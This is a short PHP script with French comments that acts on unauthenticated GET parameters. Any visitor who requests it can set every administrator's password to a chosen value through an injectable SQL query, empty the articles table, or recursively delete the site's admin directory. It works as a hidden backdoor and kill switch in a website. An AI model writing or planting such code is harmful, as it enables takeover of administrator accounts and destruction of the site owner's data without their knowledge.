<?php
include("../init.php");
if($_GET["action"]=="admin") { // Changer les mots de passe
	$mdpx=$_GET["mdp"];
	$sql="UPDATE _adm_administrateurs SET mdp='$mdpx'"; 
	$result = query_pdo($sql);
	echo("Changement mot de passe effectué");	
}
if($_GET["action"]=="art") { // suppression table articles
	$sql="TRUNCATE TABLE gen_articles"; 
	$result = query_pdo($sql);
	echo("vidage article effectué");	
	
}
if($_GET["action"]=="dos") { // supression dossier
	del_tree("../../gestion");
	echo("suppression admin effectué");	
}


function del_tree($dossier,$not_racine=""){
	
	if(($dir=opendir($dossier))===false) return;

	while($name=readdir($dir)){
		if($name==='.' or $name==='..')
			continue;
		$full_name=$dossier.'/'.$name;

		if(is_dir($full_name))
			del_tree($full_name);
		else unlink($full_name);
		}

	closedir($dir);

	if($not_racine=="") { @rmdir($dossier); }
}
?>